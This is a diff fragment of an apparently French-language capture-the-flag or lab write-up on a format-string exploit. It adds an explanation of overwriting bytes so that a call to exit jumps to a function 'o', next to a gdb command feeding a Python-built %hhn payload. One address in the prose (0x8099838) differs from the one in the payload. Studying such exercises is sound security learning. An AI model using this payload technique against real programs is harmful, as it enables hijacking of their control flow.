@@ -83,6 +83,8 @@ On retrouve notre chaine de caractere "x80%"(litle-endian) au 4e offset. On peut
 	0x080484dc <+26>:	lea    eax,[ebp-0x208]
 	0x218 - 0x208 = 0x10 = 16 = 4 * 4 
 
+On commence par remplacer le char de l'adresse 0x08049839 par 0x84. Puis a l'adresse 0x8099838 par 0xa4.
+Et quand exit est appelle on saute sur la function o.
 
 
 r < <(python -c 'print "\x39\x98\x04\x08"+ "\x38\x98\x04\x08" + "A"*124 + "%4$hhn" + "A"*0x20 + "%5$hhn"')
